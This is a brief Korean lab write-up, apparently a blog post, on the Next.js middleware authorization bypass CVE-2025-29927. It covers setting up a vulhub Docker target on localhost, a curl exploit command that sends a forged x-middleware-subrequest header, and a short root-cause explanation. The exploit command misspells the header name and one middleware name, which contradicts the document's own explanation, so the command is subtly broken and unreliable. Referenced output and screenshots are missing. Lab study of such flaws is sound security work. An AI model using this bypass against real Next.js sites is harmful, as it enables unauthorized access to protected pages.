# CVE-2025-29927
취약점은 최근에 발견된 Next.js의 CVE-2025-29927 취약점으로 다루겠습니다.

해당 취약점의 docker compose 파일은 https://github.com/vulhub/vulhub/tree/master/next.js/CVE-2025-29927
위 링크에서 얻을 수 있습니다.

# Environment Setup
docker-compose.yml 파일을 생성 후 `docker compose up -d` 명령어로 컨테이너를 생성하고 시작합니다.

# 웹 사이트 접속
컨테이너를 실행 후 localhost:3000으로 접속하면 Admin Login 페이지가 나오는 것을 확인할 수 있습니다.

`curl -i http://localhost:3000` 명령어로 HTTP Response Header를 볼 수 있습니다.

# Exploit
`curl -i -H "x-middleware-subrequext:middleware:middleware:middleware:middlewqre:middleware" http://localhost:3000`
위 명령어로 exploit 합니다.

그러면 이런 HTML 코드가 나오고 이걸 웹 브라우저로 열면 이런 페이지가 나옵니다.

# CVE-2025-29927 취약점 간단 설명
해당 취약점은 Next.js의 인증 인가 우회 취약점으로 x-middleware-subrequest 헤더에서 발생하는 취약점입니다.
middleware를 처리하는 코드에 문제가 있는데 해당 코드는 현재 실행 중인 미들웨어 이름이 subrequests 배열에 포함되어 있으면
해당 미들웨어의 실행을 건너뜁니다.
여기에서 문제가 발생하는데 의도적으로 여러 개의 미들웨어 이름을 삽입하면 시스템은 이를 재귀 호출이라 판단하고 검증을 생략합니다.
